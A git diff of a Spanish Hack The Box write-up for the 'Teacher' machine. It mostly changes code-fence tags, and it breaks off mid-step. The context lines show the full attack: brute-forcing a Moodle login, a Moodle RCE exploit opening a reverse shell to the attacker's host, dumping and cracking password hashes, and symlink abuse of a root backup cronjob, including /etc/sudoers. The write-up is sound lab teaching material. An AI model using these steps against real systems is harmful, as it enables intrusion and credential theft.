@@ -26,7 +26,7 @@ Su tarjeta de presentación es:
 
 Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:
 
-```text
+``` text
 root@laptop:~# nmap -sS -p- --open -v -n 10.10.10.153
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-15 13:03 CST
 Initiating Ping Scan at 13:03
@@ -57,7 +57,7 @@ Nmap done: 1 IP address (1 host up) scanned in 92.83 seconds
 
 Continuemos validando los puertos TCP abiertos con masscan:
 
-```text
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.153
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-15 06:03:50 GMT
@@ -77,7 +77,7 @@ Como podemos ver los puertos son los mismos, por lo que iniciamos por identifica
 
 Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):
 
-```text
+``` text
 root@laptop:~# nmap -p80 --open -v -n 10.10.10.153 -sV -sC
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-15 13:10 CST
 NSE: Loaded 148 scripts for scanning.
@@ -134,7 +134,7 @@ Reconocemos el servicio del servidor `Apache 2.4.25` sobre el puerto TCP/80. Con
 
 Ejecutando `dirb` para reconocer el servicio tenemos lo siguiente:
 
-```text
+``` text
 xbytemx@laptop:~/htb/teacher$ dirb http://10.10.10.153/ -o dirb.txt
 
 -----------------
@@ -280,7 +280,7 @@ Así que una de las aplicaciones sobre el servidor Apache es moodle. Tiene senti
 
 Para validar algunas otras carpetas y archivos, ejecute un `gobuster`:
 
-```text
+``` text
 xbytemx@laptop:~/htb/teacher$ ~/tools/gobuster -u http://10.10.10.153/ -w ~/git/payloads/owasp/dirbuster/directory-list-2.3-small.txt -s '200,204,301,302,307,403,500' -t 20 -x php,txt
 
 =====================================================
@@ -313,7 +313,7 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 
 En el root del servidor tenemos:
 
-```html
+``` html
 xbytemx@laptop:~/htb/teacher$ http http://10.10.10.153/
 HTTP/1.1 200 OK
 Accept-Ranges: bytes
@@ -581,7 +581,7 @@ Vary: Accept-Encoding
 
 Después de explorar un rato la pagina, decidí hacer un mirror:
 
-```text
+``` text
 xbytemx@laptop:~/htb/teacher$ wget --mirror http://10.10.10.153
 --2019-01-15 20:26:22--  http://10.10.10.153/
 Conectando con 10.10.10.153:80... conectado.
@@ -1446,7 +1446,7 @@ Descargados: 85 ficheros, 2.2M en 1.8s (1.20 MB/s)
 
 Revisando archivo por archivo no encontraremos nada importante. Pero algo llamo mi atención al hacer un file sobre todos los archivos:
 
-```text
+``` text
 xbytemx@laptop:~/htb/teacher/10.10.10.153$ find . -exec file {} \;
 .: directory
 ./css: directory
@@ -1542,7 +1542,7 @@ xbytemx@laptop:~/htb/teacher/10.10.10.153$ find . -exec file {} \;
 
 Exactamente en:
 
-```
+``` text
 ./images/5.png: ASCII text
 ```
 
@@ -1554,7 +1554,7 @@ Algo no esta bien aquí.
 
 Tratemos esto como si fuera un CTF y estamos ante un reto stego:
 
-```text
+``` text
 xbytemx@laptop:~/htb/teacher$ file 5.png
 5.png: ASCII text
 xbytemx@laptop:~/htb/teacher$ cat 5.png
@@ -1575,7 +1575,7 @@ Tenemos un patrón de contraseña `Th4C00lTheacha` y un usuario **Giovanni**
 
 Para encontrar las credenciales de Giovanni, usaremos `wfuzz` sobre la aplicación de moodle (ya que en blackhatuni no podemos hacer nada mas de momento):
 
-```text
+``` text
 xbytemx@laptop:~/htb/teacher$ wfuzz -c -z file,/home/xbytemx/git/SecLists/Fuzzing/alphanum-case-extra.txt --hh 440 -d 'username=Giovanni&password=Th4C00lTheachaFUZZ' http://10.10.10.153/moodle/login/index.php
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -1612,7 +1612,7 @@ Requests/sec.: 5.533309
 
 Ahora que tenemos unas credenciales validas y podemos entrar a moodle, buscaremos exploits existentes que nos puedan conducir a un RCE:
 
-```text
+``` text
 xbytemx@laptop:~/git/exploit-database$ ./searchsploit moodle 3.4
 ------------------------------------------------------- -------------------------------------------------------
  Exploit Title                                         |  Path
@@ -1627,13 +1627,13 @@ Guardamos el exploit y lo ejecutamos con los parámetros necesarios, no sin ante
 
 Para realizar la reverse shell:
 
-```text
+``` text
 xbytemx@laptop:~/htb/teacher$ php 46551.php url=http://10.10.10.153/moodle/ user=Giovanni pass=Th4C00lTheacha# ip=10.10.13.42 port=3001 course=2 debug=true
 ```
 
 En el listener:
 
-```text
+``` text
 xbytemx@laptop:~/htb/teacher$ ncat -nvlp 3001
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::3001
@@ -1651,7 +1651,7 @@ Como nota que no debemos olvidar, este exploit fue gracias al siguiente [artícu
 
 Continuando como www-data:
 
-```text
+``` text
 $ python -c "import pty; pty.spawn('/bin/bash')"
 www-data@teacher:/var/www/html$ cat html/moodle/config.php.save
 cat html/moodle/config.php.save
@@ -1689,7 +1689,7 @@ www-data@teacher:/var/www$
 
 Excelente, tenemos las credenciales de root... pero de mysql. Probemos la cuenta de Giovanni como giovanni:
 
-```text
+``` text
 www-data@teacher:/var/www$ su - giovanni
 su - giovanni
 Password: Th4C00lTheacha#
@@ -1699,7 +1699,7 @@ su: Authentication failure
 
 Parece que no son las mismas credenciales que hemos obtenido antes. Exploremos la DB para ver que mas podemos encontrar (Recordemos que para que moodle puede funcionar, debe tener una DB declarada donde almacene su información):
 
-```text
+``` text
 www-data@teacher:/var/www$ mysql -u root -p
 mysql -u root -p
 Enter password: Welkom1!
@@ -2130,7 +2130,7 @@ show tables;
 
 Esas fueron muchas tablas. Todo para ir tras mdl_users:
 
-```text
+``` text
 MariaDB [moodle]> select * from mdl_user;
 select * from mdl_user;
 +------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+
@@ -2157,7 +2157,7 @@ Traducido y simplificado a otra tabla:
 
 Así resulta evidente que tenemos 3 hash de bcrypt y uno de otro tipo:
 
-```text
+``` text
 xbytemx@laptop:~/htb/teacher$ hashid 7a860966115182402ed06375cf0a22af
 Analyzing '7a860966115182402ed06375cf0a22af'
 [+] MD2
@@ -2182,7 +2182,7 @@ Analyzing '7a860966115182402ed06375cf0a22af'
 
 Se trata de un MD5, así que `hashcat` a la obra:
 
-```text
+``` text
 xbytemx@laptop:~/htb/teacher$ hashcat -a0 -m0 7a860966115182402ed06375cf0a22af /home/xbytemx/wl/rockyou.txt --force
 hashcat (v5.1.0) starting...
 
@@ -2218,7 +2218,7 @@ Stopped: Thu Apr  4 22:52:19 2019
 
 Volvamos a ingresar como giovanni:
 
-```text
+``` text
 www-data@teacher:/var/www$ su - giovanni
 su - giovanni
 Password: expelled
@@ -2230,7 +2230,7 @@ giovanni@teacher:~$
 
 # `cat user.txt`
 
-```text
+``` text
 giovanni@teacher:~$ cat user.txt
 cat user.txt
 ```
@@ -2239,7 +2239,7 @@ cat user.txt
 
 Veamos el contenido del home de giovanni:
 
-```text
+``` text
 giovanni@teacher:~$ ls -lahR
 ls -lahR
 .:
@@ -2303,7 +2303,7 @@ Nos llama la atención el archivo `backup_courses.tar.gz` y que la carpeta tmp t
 Tras ver que el archivo `backup_courses.tar.gz` cambiaba con el tiempo, esto fue una clara señal de un malevolo cronjob, por lo que lance `pspy`:
 
 
-```text
+``` text
 giovanni@teacher:~$ /var/www/moodledata/.tmp/pspy64
 /var/www/moodledata/.tmp/pspy64
 Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
@@ -2323,7 +2323,7 @@ Config: Printing events (colored=true): processes=true | file-system-events=fals
 
 Ahora sabemos que existe un cronjob de root que ejecuta `/usr/bin/backup.sh`, por lo que veamos en su contenido:
 
-```text
+``` text
 giovanni@teacher:~$ cat /usr/bin/backup.sh
 #!/bin/bash
 cd /home/giovanni/work;
@@ -2339,7 +2339,7 @@ Esto se ejecuta como **root** sobre archivos que son de **giovanni**:
 
 INPUT
 
-```text
+``` text
 ./work:
 drwxr-xr-x 3 giovanni giovanni 4.0K Jun 27  2018 courses
 ```
@@ -2350,7 +2350,7 @@ Hay un [articulo](https://www.hackingarticles.in/exploiting-wildcard-for-privile
 
 En este caso, abusaremos que podemos crear enlaces simbolicos y realizaremos un backup pero de `/root`:
 
-```text
+``` text
 giovanni@teacher:~$ cd work
 cd work
 giovanni@teacher:~/work$ ls
@@ -2400,7 +2400,7 @@ giovanni@teacher:~/work$
 
 Ahora que tenemos el b64 del backup de root solo es crear el archivo y descomprimir:
 
-```text
+``` text
 xbytemx@laptop:~/htb/teacher$ cat backup_courses.tar.gz.b64
 H4sIAHntplwAA+3QOw7CMBCEYdecIieA9XPNcewotJFiR+L4PEqCoIoQ0v81U+wUox3ndWlTOy3z
 3I/92s0O5C6JPFO2KRKssd7bEFNS9Uas0xTNIHuMebW2XpZhMI8HfOp9u/+pcPEl+xpcGVWdL1Fy
@@ -2416,7 +2416,7 @@ drwxr-xr-x 4 xbytemx xbytemx 4.0K abr 27 20:38 ..
 
 # `cat root.txt`
 
-```text
+``` text
 xbytemx@laptop:~/htb/teacher$ cat courses/root.txt
 ```
 
@@ -2426,7 +2426,7 @@ Pero aun nos falta la shell!
 
 # Abusing backup script again.
 
-```text
+``` text
 giovanni@teacher:~$ cat /usr/bin/backup.sh
 #!/bin/bash
 cd /home/giovanni/work;
@@ -2440,7 +2440,7 @@ Como sabemos, el script de backup tiene dos partes una donde comprime y otra don
 
 Ahora, como los comandos no están concatenados ni evalúan la salida exitosa, ¿que pasaría si en lugar de que el enlace simbólico fuera courses, fuera algún archivo dentro de tmp? Pues básicamente estaríamos asignando un 777 a ese archivo. El archivo podría ser sudoers por ejemplo, permitiendo que giovanni haga sudo:
 
-```text
+``` text
 giovanni@teacher:~/work$ mv tmp tmp.old
 mv tmp tmp.old
 giovanni@teacher:~/work$ ln -s /etc/sudoers tmp
